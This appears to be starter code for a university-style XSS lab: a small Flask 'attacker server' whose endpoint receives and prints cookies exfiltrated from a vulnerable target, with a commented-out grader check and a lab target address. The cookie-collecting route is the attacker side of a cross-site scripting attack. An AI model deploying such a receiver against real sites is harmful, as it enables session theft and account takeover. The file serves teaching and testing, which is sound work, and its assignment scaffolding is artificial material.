"""You are welcome to use any part of the Python Standard Library in addition to Flask."""
from flask import Flask, render_template, abort, request, make_response
import base64
from http.cookies import SimpleCookie
import sys

sys.path.append("..")
import grader

TARGET_SERVER_ENDPOINT = 'http://localhost:1337'
# TARGET_SERVER_ENDPOINT = 'http://35.225.46.109:80'

app = Flask(__name__)


@app.route('/xss/<vuln_type>')
def steal_cookie(vuln_type):
    """
    Use this to exfiltrate a stolen cookie from the vulnerable server.
    """
    received_cookie = request.args.get('cookie', default='')
    print(received_cookie)

    # Reads the `cookie` parameter "password"

    # grader.xss_verify(vuln_type, password) # Remember to decode the password.

    return received_cookie


# NOTE: You are free to add additional routes/endpoints to the attacker server to mount any attack of your choosing.
if __name__ == '__main__':
    app.run(port=1338)
    # app.run(host="0.0.0.0", port=80)
